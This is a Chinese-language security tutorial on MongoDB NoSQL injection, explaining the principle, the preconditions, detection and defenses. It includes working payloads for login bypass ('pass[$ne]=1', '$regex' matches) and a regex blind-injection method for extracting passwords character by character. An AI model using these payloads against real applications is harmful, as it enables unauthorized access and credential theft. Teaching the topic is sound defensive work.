# NoSQL 注入（MongoDB 为主）

## 一句话理解
SQL 注入是让输入变成"语句的一部分"，NoSQL 注入是让输入从"一个值"变成"一个查询对象"——`$ne`、`$gt`、`$regex` 这些操作符一旦由用户控制，查询语义就被改写。

## 核心原理
以 MongoDB 为例，查询条件是 JSON/BSON 对象：

```javascript
db.users.find({username: "admin", password: "123456"})
```

如果后端直接把用户提交的数组/对象拼进查询条件，攻击者提交的不是字符串而是操作符：

```javascript
db.users.find({username: "admin", password: {$ne: 1}})
// 密码"不等于1"恒真 -> 认证绕过
```

关键点：**参数被解析成数组/对象，而不是字符串**。

## 成立条件
- 后端使用 MongoDB 等文档型数据库
- 用户输入未经类型校验进入查询条件
- 框架支持数组/对象式参数解析：
  - PHP：`?pass[$ne]=1` 自动解析为数组
  - Node.js（Express + qs 库）：`?pass[$ne]=1` 解析为对象
  - JSON 接口：`{"pass": {"$ne": 1}}`

## 常见攻击形式
### 1. 认证绕过

```text
POST user=admin&pass[$ne]=1
POST user[$gt]=&pass[$gt]=
{"user": "admin", "pass": {"$regex": ".*"}}
```

### 2. 布尔盲注（枚举数据）
利用 `$regex` 逐位爆破字段内容：

```text
user=admin&pass[$regex]=^a       正确 -> 登录成功/页面正常
user=admin&pass[$regex]=^b       错误 -> 登录失败
```

配合脚本按位扩大前缀，把密码/hash 完整拖出。

### 3. `$where` JS 注入（老版本）
MongoDB 早期支持 `$where` 执行 JavaScript：

```text
user=admin&pass[$where]=1
```

可做布尔判断、延时（`sleep`），现代版本多已禁用，遇到老应用仍可一试。

### 4. 字段枚举与报错
- 提交非法操作符（`[$xxx]`）触发报错，泄露后端类型与查询结构
- 利用 `$lookup`（聚合管道注入）跨集合读数据（少见但 CTF 出现过）

## 快速判断
| 操作 | 现象 | 说明 |
| --- | --- | --- |
| 正常账号 + 错误密码 | 登录失败 | 基线 |
| `pass[$ne]=1` | 登录成功 | 存在注入 |
| `pass[$regex]=^a` vs `^b` | 响应有差异 | 可盲注 |
| 传数组后报错 | 泄露堆栈/驱动信息 | 辅助确认 |

## 工具
- [NoSQLMap](https://github.com/codingo/NoSQLMap)：自动化检测
- Burp 手工改包：大多数场景足够，重点是把参数改成数组/对象形式

## 与相邻篇目的关系
- Redis 未授权访问与主从复制 RCE：见 [EXP-DB-Redis](./EXP-DB-Redis.md)（那是"服务暴露"问题，本篇是"查询注入"）
- 与 XPath 注入思路同构（都是"查询语言语义被改写"）：见 [EXP-XPath](./EXP-XPath.md)

## 防御要点
- 服务端强制类型校验：查询条件中的字段必须是字符串，拒绝数组/对象
- 过滤以 `$` 开头的键名（如 `express-mongo-sanitize`）
- 禁用 `$where`，使用参数化/ODM 构造查询

## 参考
- [OWASP NoSQL Injection](https://owasp.org/www-community/attacks/NoSQL_injection)
- [PortSwigger NoSQL injection](https://portswigger.net/web-security/nosql-injection)
